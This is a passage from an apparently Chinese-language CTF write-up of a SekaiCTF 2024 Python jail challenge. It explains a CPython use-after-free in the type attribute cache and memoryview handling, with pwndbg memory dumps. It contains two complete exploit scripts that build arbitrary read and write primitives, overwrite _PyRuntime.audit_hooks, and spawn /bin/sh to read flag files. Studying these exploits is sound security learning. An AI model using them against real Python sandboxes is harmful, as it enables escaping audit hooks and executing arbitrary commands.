+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wrap</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">memoryview</span>(arg).cast(<span class="hljs-string">&#x27;P&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orfn</span>(<span class="hljs-params">self, other</span>):<br>    self.a<br>    <span class="hljs-keyword">del</span> other[<span class="hljs-string">&#x27;a&#x27;</span>]<br>    <span class="hljs-keyword">return</span> wrap(self.a), [<span class="hljs-number">0</span>]*<span class="hljs-number">10</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rorfn</span>(<span class="hljs-params">self, other</span>):<br>    <span class="hljs-keyword">return</span> self.__or__(other)<br><br>t = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (), &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x40</span>), <span class="hljs-string">&#x27;__ror__&#x27;</span>: rorfn, <span class="hljs-string">&#x27;__or__&#x27;</span>: orfn&#125;)<br>a, b = t.__dict__ | t()<br></code></pre></td></tr></table></figure>
+
+<p>大致流程</p>
+<ul>
+<li><p>新建了一个type t，自带一个bytearray a，还有自实现的__ror__和__or__方法</p>
+<img src="/2024/08/31/sekai2024jailwp/bytearray_a.png" srcset="/img/loading.gif" lazyload class title="bytearray_a">
+</li>
+<li><p>然后进行一个t.__dict__和t()的or</p>
+<img src="/2024/08/31/sekai2024jailwp/or1.png" srcset="/img/loading.gif" lazyload class title="or1">
+
+<ul>
+<li><p>mappingproxyobject的t.__dict__</p>
+<img src="/2024/08/31/sekai2024jailwp/or1_proxy.png" srcset="/img/loading.gif" lazyload class title="or1_proxy">
+
+<p>v-&gt;mapping指向一个PyDictObject</p>
+<img src="/2024/08/31/sekai2024jailwp/or1_dict.png" srcset="/img/loading.gif" lazyload class title="or1_dict">
+</li>
+<li><p>t类型的PyObject实例</p>
+<img src="/2024/08/31/sekai2024jailwp/or1_w.png" srcset="/img/loading.gif" lazyload class title="or1_w">
+
+<p>PyTypeObject的type t</p>
+<img src="/2024/08/31/sekai2024jailwp/or1_w_type.png" srcset="/img/loading.gif" lazyload class title="or1_w_type">
+
+<p>可以发现v-&gt;mapping和w-&gt;ob_base.ob_type-&gt;tp_dict指向同一个PyDictObject</p>
+<img src="/2024/08/31/sekai2024jailwp/or1_dict_mapping.png" srcset="/img/loading.gif" lazyload class title="or1_dict_mapping"></li>
+</ul>
+</li>
+<li><p>经过一次mappingproxy_or，去除了mappingproxy-&gt;mapping的wrap，进行一个dict和t()的or</p>
+<img src="/2024/08/31/sekai2024jailwp/or2.png" srcset="/img/loading.gif" lazyload class title="or2">
+
+<img src="/2024/08/31/sekai2024jailwp/or2_w_v.png" srcset="/img/loading.gif" lazyload class title="or2_w_v">
+</li>
+<li><p>在__or__中获取a，这时候self是type t的PyObject，other是PyDictObject</p>
+<img src="/2024/08/31/sekai2024jailwp/get_a_1_ins.png" srcset="/img/loading.gif" lazyload class title="get_a_1_ins">
+
+<img src="/2024/08/31/sekai2024jailwp/get_a_1.png" srcset="/img/loading.gif" lazyload class title="get_a_1">
+
+<p>这个过程中会将a的ref+1，但由于只是取了a什么都没干，所以之后ref会减回1</p>
+<img src="/2024/08/31/sekai2024jailwp/a_1_ref.png" srcset="/img/loading.gif" lazyload class title="a_1_ref">
+</li>
+<li><p>之后从other中删除a，这时候other已经是dict了</p>
+<img src="/2024/08/31/sekai2024jailwp/del_a.png" srcset="/img/loading.gif" lazyload class title="del_a">
+
+<img src="/2024/08/31/sekai2024jailwp/del_a_obj.png" srcset="/img/loading.gif" lazyload class title="del_a_obj">
+
+<p>并且将a的ref-1，这时候a的ref已经是0了，所以调用bytearray_dealloc将a和a-&gt;ob_bytes都free了</p>
+<img src="/2024/08/31/sekai2024jailwp/a_0_ref.png" srcset="/img/loading.gif" lazyload class title="a_0_ref">
+
+<img src="/2024/08/31/sekai2024jailwp/dealloc_a.png" srcset="/img/loading.gif" lazyload class title="dealloc_a">
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">bytearray_dealloc</span><span class="hljs-params">(PyByteArrayObject *self)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (self-&gt;ob_exports &gt; <span class="hljs-number">0</span>) &#123;<br>        PyErr_SetString(PyExc_SystemError,<br>                        <span class="hljs-string">&quot;deallocated bytearray object has exported buffers&quot;</span>);<br>        PyErr_Print();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (self-&gt;ob_bytes != <span class="hljs-number">0</span>) &#123;<br>        PyObject_Free(self-&gt;ob_bytes);<br>    &#125;<br>    Py_TYPE(self)-&gt;tp_free((PyObject *)self);<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>然后又通过self.a（type t的PyObject）获取到了a</p>
+<img src="/2024/08/31/sekai2024jailwp/get_a_2.png" srcset="/img/loading.gif" lazyload class title="get_a_2">
+
+<img src="/2024/08/31/sekai2024jailwp/get_a_2_obj.png" srcset="/img/loading.gif" lazyload class title="get_a_2_obj">
+
+<img src="/2024/08/31/sekai2024jailwp/a_1_ref_2.png" srcset="/img/loading.gif" lazyload class title="a_1_ref_2"></li>
+</ul>
+<p><em>…</em></p>
+<p><em>……</em></p>
+<p><em>？？？啊？？？</em></p>
+<h2 id="看似没有问题实则全是问题……"><a href="#看似没有问题实则全是问题……" class="headerlink" title="看似没有问题实则全是问题……"></a>看似没有问题实则全是问题……</h2><ul>
+<li><p>首先第二次PyObject_GenericGetAttr就不该获取到a，因为a已经从dict中删除了</p>
+<img src="/2024/08/31/sekai2024jailwp/test_print.png" srcset="/img/loading.gif" lazyload class title="test_print">
+
+<p>……看起来确实也是删掉了</p>
+</li>
+<li><p>delitem_common结尾a的ref确实也减到0了，也确实调用dealloc把a free了……</p>
+<img src="/2024/08/31/sekai2024jailwp/a_0_ref.png" srcset="/img/loading.gif" lazyload class title="a_0_ref">
+
+<img src="/2024/08/31/sekai2024jailwp/dealloc_a.png" srcset="/img/loading.gif" lazyload class title="dealloc_a">
+</li>
+<li><p>两次PyObject_GenericGetAttr的参数也是一样的</p>
+<img src="/2024/08/31/sekai2024jailwp/get_a_1_ins.png" srcset="/img/loading.gif" lazyload class title="get_a_1_ins">
+
+<img src="/2024/08/31/sekai2024jailwp/get_a_2.png" srcset="/img/loading.gif" lazyload class title="get_a_2">
+</li>
+<li><p>能想到的就是get a是通过type进行的，del a是通过dict进行的</p>
+</li>
+</ul>
+<h2 id="PyType-Lookup"><a href="#PyType-Lookup" class="headerlink" title="_PyType_Lookup"></a>_PyType_Lookup</h2><p>那就来看看PyObject_GenericGetAttr是怎么获取a的</p>
+<ul>
+<li>PyObject_GenericGetAttr调用_PyObject_GenericGetAttrWithDict</li>
+<li>_PyObject_GenericGetAttrWithDict大致流程<ul>
+<li>调用_PyType_Lookup从type中尝试获取name</li>
+<li>尝试从实例中获取name</li>
+</ul>
+</li>
+</ul>
+<p><em><strong>问题就出在_PyType_Lookup里！！！</strong></em></p>
+<p>_PyType_Lookup的流程</p>
+<ul>
+<li>先尝试从type_cache中查找name</li>
+<li>找不到则从type-&gt;tp_dict（就是dict）查找</li>
+<li>将PyObject加入cache</li>
+</ul>
+<p><em>对了，就是这个cache……</em></p>
+<ul>
+<li>第一次self.a的时候会将a放进cache，且不会递增a的ref</li>
+<li>第二次self.a的时候直接从cache中取</li>
+</ul>
+<p><em>终于知道第一个没用的self.a是干嘛的了，就是为了把它放进cache</em></p>
+<ul>
+<li>由于dealloc了a但没将a从cache中删掉导致了uaf</li>
+<li>理论上来说type是不可写的所以cache放进去就不会再取出来了</li>
+<li>但假定的type的不可写被打破了就出问题了</li>
+</ul>
+<p><strong>结论：有些过程是基于不可写的假定进行的，这个假定被打破了就出问题了</strong></p>
+<h1 id="几种解法"><a href="#几种解法" class="headerlink" title="几种解法"></a>几种解法</h1><h2 id="利用memoryview的index的uaf"><a href="#利用memoryview的index的uaf" class="headerlink" title="利用memoryview的index的uaf"></a>利用memoryview的index的uaf</h2><p>先贴exp</p>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># implementation from https://github.com/chilaxan/pysnippets/blob/main/tricky_bugs.py#L51</span><br><span class="hljs-comment"># but modified to work with current version. Abuses how the `c` format doesn&#x27;t have a release</span><br><span class="hljs-comment"># check after running our __index__ func</span><br><br>uaf_backing = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytearray</span>.__basicsize__)<br>uaf_view = <span class="hljs-built_in">memoryview</span>(uaf_backing).cast(<span class="hljs-string">&#x27;c&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">weird_index</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__index__</span>(<span class="hljs-params">self</span>):<br>        uaf_view.release()<br>        self.memory_backing = uaf_backing.clear() <span class="hljs-keyword">or</span> <span class="hljs-built_in">bytearray</span>()<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0x17</span><br><br>uaf_view[w:=weird_index()] = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x7f</span>])<br><br>mem = w.memory_backing<br><br>RUNTIME_OFFSET = <span class="hljs-number">0x654900</span><br>A_CONST_OFFSET = <span class="hljs-number">0x65D910</span><br><br>a_addr = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;a&#x27;</span>.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>python_base = a_addr - A_CONST_OFFSET<br>py_runtime = python_base + RUNTIME_OFFSET<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    mem[py_runtime + <span class="hljs-number">0xBF0</span> + <span class="hljs-number">8</span> + i] = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">import</span> os<br>os.execv(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;cat /flag*&quot;</span>])<br><br><span class="hljs-comment"># EOF</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><ul>
+<li><p>uaf_backing地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// uaf_backing</span><br><br>pwndbg&gt; print obj<br>$<span class="hljs-number">2</span> = (PyObject *) <span class="hljs-number">0x7f94e2c6ed30</span><br>pwndbg&gt; print *(PyByteArrayObject*)obj<br>$<span class="hljs-number">3</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">56</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">57</span>,<br>  ob_bytes = <span class="hljs-number">0x7f94e2c6f230</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_start = <span class="hljs-number">0x7f94e2c6f230</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>uaf_view地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// uaf_view</span><br><br>pwndbg&gt; print *(PyMemoryViewObject*)<span class="hljs-number">0x7f94e2df9600</span><br>$<span class="hljs-number">5</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03551c0</span> &lt;PyMemoryView_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">3</span><br>  &#125;,<br>  mbuf = <span class="hljs-number">0x7f94e2c7a2c0</span>,<br>  hash = <span class="hljs-number">-1</span>,<br>  flags = <span class="hljs-number">6</span>,<br>  exports = <span class="hljs-number">0</span>,<br>  view = &#123;<br>    buf = <span class="hljs-number">0x7f94e2c6f230</span>,<br>    obj = <span class="hljs-number">0x7f94e2c6ed30</span>,<br>    len = <span class="hljs-number">56</span>,<br>    itemsize = <span class="hljs-number">1</span>,<br>    readonly = <span class="hljs-number">0</span>,<br>    ndim = <span class="hljs-number">1</span>,<br>    format = <span class="hljs-number">0x5648e00d2041</span> <span class="hljs-string">&quot;B&quot;</span>,<br>    shape = <span class="hljs-number">0x7f94e2df9690</span>,<br>    strides = <span class="hljs-number">0x7f94e2df9698</span>,<br>    suboffsets = <span class="hljs-number">0x0</span>,<br>    internal = <span class="hljs-number">0x0</span><br>  &#125;,<br>  weakreflist = <span class="hljs-number">0x0</span>,<br>  ob_array = &#123;<span class="hljs-number">56</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>clear后的uaf_backing，uaf_view-&gt;view.buf已被free</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// clear</span><br><br>pwndbg&gt; print *(PyByteArrayObject*)<span class="hljs-number">0x7f94e2c6ed30</span><br>$<span class="hljs-number">13</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">2</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">0</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">1</span>,<br>  ob_bytes = <span class="hljs-number">0x7f94e2e24250</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_start = <span class="hljs-number">0x7f94e2e24250</span> <span class="hljs-string">&quot;&quot;</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>新的PyByteArrayObject，被赋值给了w.memory_backing</p>
+<ul>
+<li>和uaf_view-&gt;view.buf使用同一块内存</li>
+<li>由于bytearray()没有参数所以ob_size为0且不分配ob_bytes</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// w.memory_backing</span><br><br>pwndbg&gt; print *(PyByteArrayObject*)<span class="hljs-number">0x7f94e2c6f230</span><br>$<span class="hljs-number">17</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">0</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">0</span>,<br>  ob_bytes = <span class="hljs-number">0x0</span>,<br>  ob_start = <span class="hljs-number">0x0</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>向原先的uaf_view-&gt;view.buf[0x17]中写入0x7f，w.memory_backing的ob_size被修改为极大值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// new</span><br><br>pwndbg&gt; print *(PyByteArrayObject*)<span class="hljs-number">0x7f94e2c6f230</span><br>$<span class="hljs-number">28</span> = &#123;<br>  ob_base = &#123;<br>    ob_base = &#123;<br>      &#123;<br>        ob_refcnt = <span class="hljs-number">1</span>,<br>        ob_refcnt_split = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>      &#125;,<br>      ob_type = <span class="hljs-number">0x5648e03408c0</span> &lt;PyByteArray_Type&gt;<br>    &#125;,<br>    ob_size = <span class="hljs-number">9151314442816847872</span>	<span class="hljs-comment">// 0x7f00000000000000</span><br>  &#125;,<br>  ob_alloc = <span class="hljs-number">0</span>,<br>  ob_bytes = <span class="hljs-number">0x0</span>,<br>  ob_start = <span class="hljs-number">0x0</span>,<br>  ob_exports = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>改_PyRuntime.audit_hooks</p>
+<img src="/2024/08/31/sekai2024jailwp/audit_hook.png" srcset="/img/loading.gif" lazyload class title="audit_hook"></li>
+</ul>
+<h2 id="利用mappingproxy-or的uaf"><a href="#利用mappingproxy-or的uaf" class="headerlink" title="利用mappingproxy_or的uaf"></a>利用mappingproxy_or的uaf</h2><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://bugs.python.org/issue43838</span><br><span class="hljs-comment"># https://bugs.python.org/issue44596</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wrap</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">memoryview</span>(arg).cast(<span class="hljs-string">&#x27;P&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orfn</span>(<span class="hljs-params">self, other</span>):<br>    self.a<br>    <span class="hljs-keyword">del</span> other[<span class="hljs-string">&#x27;a&#x27;</span>]<br>    <span class="hljs-keyword">return</span> wrap(self.a), [<span class="hljs-number">0</span>]*<span class="hljs-number">10</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rorfn</span>(<span class="hljs-params">self, other</span>):<br>    <span class="hljs-keyword">return</span> self.__or__(other)<br><br>t = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (), &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x40</span>), <span class="hljs-string">&#x27;__ror__&#x27;</span>: rorfn, <span class="hljs-string">&#x27;__or__&#x27;</span>: orfn&#125;)<br>a, b = t.__dict__ | t()<br><br><span class="hljs-comment"># (PyByteArrayObject *) a-&gt;ob_bytes and</span><br><span class="hljs-comment"># (PyListObject *) b-&gt;ob_item now share the same memory</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>):<br>    b[<span class="hljs-number">0</span>] = obj<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_bytearray</span>(<span class="hljs-params">addr, size</span>):<br>    m = wrap(<span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x100</span>))<br>    m[<span class="hljs-number">0</span>] = <span class="hljs-number">3</span> <span class="hljs-comment"># refcnt</span><br>    m[<span class="hljs-number">1</span>] = addrof(<span class="hljs-built_in">bytearray</span>)<br>    m[<span class="hljs-number">2</span>] = size<br>    m[<span class="hljs-number">5</span>] = addr<br>    x = m.tobytes()<br>    a[<span class="hljs-number">0</span>] = addrof(x) + <span class="hljs-number">32</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arb_read</span>(<span class="hljs-params">addr</span>):<br>    fake_bytearray(addr, <span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> wrap(b[<span class="hljs-number">0</span>]).tolist().pop()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arb_write</span>(<span class="hljs-params">addr, value</span>):<br>    fake_bytearray(addr, <span class="hljs-number">8</span>)<br>    wrap(b[<span class="hljs-number">0</span>])[<span class="hljs-number">0</span>] = value<br><br>RUNTIME_OFFSET = <span class="hljs-number">0x654900</span><br>A_CONST_OFFSET = <span class="hljs-number">0x65D910</span><br><br>python_base = addrof(<span class="hljs-string">&#x27;a&#x27;</span>) - A_CONST_OFFSET<br>py_runtime = python_base + RUNTIME_OFFSET<br>arb_write(py_runtime + <span class="hljs-number">0xBF0</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">import</span> os<br>os.execv(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;cat /flag*&quot;</span>])<br><br><span class="hljs-comment"># EOF</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><ul>
+<li><p>触发uaf之后</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">t = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (), &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x40</span>), <span class="hljs-string">&#x27;__ror__&#x27;</span>: rorfn, <span class="hljs-string">&#x27;__or__&#x27;</span>: orfn&#125;)<br>a, b = t.__dict__ | t()<br><br><span class="hljs-comment"># (PyByteArrayObject *) a-&gt;ob_bytes and</span><br><span class="hljs-comment"># (PyListObject *) b-&gt;ob_item now share the same memory</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2024/08/31/sekai2024jailwp/map1.png" srcset="/img/loading.gif" lazyload class title="map1">
+
+<img src="/2024/08/31/sekai2024jailwp/t_a.png" srcset="/img/loading.gif" lazyload class title="t_a">
+
+<img src="/2024/08/31/sekai2024jailwp/a_memoryview.png" srcset="/img/loading.gif" lazyload class title="a_memoryview">
+
+<img src="/2024/08/31/sekai2024jailwp/b_list.png" srcset="/img/loading.gif" lazyload class title="b_list">
+</li>
+<li><p>addrof</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">addrof</span><span class="hljs-params">(obj)</span>:<br>    b[0] = obj<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/08/31/sekai2024jailwp/map2.png" srcset="/img/loading.gif" lazyload class title="map2">
+</li>
+<li><p>fake_bytearray</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_bytearray</span>(<span class="hljs-params">addr, size</span>):<br>    m = wrap(<span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x100</span>))<br>    m[<span class="hljs-number">0</span>] = <span class="hljs-number">3</span> <span class="hljs-comment"># refcnt</span><br>    m[<span class="hljs-number">1</span>] = addrof(<span class="hljs-built_in">bytearray</span>)<br>    m[<span class="hljs-number">2</span>] = size<br>    m[<span class="hljs-number">5</span>] = addr<br>    x = m.tobytes()<br>    a[<span class="hljs-number">0</span>] = addrof(x) + <span class="hljs-number">32</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2024/08/31/sekai2024jailwp/map3.png" srcset="/img/loading.gif" lazyload class title="map3">
+
+<img src="/2024/08/31/sekai2024jailwp/m_bytearray.png" srcset="/img/loading.gif" lazyload class title="m_bytearray">
+
+<img src="/2024/08/31/sekai2024jailwp/m_memoryview.png" srcset="/img/loading.gif" lazyload class title="m_memoryview">
+
+<img src="/2024/08/31/sekai2024jailwp/x_bytes.png" srcset="/img/loading.gif" lazyload class title="x_bytes">
+
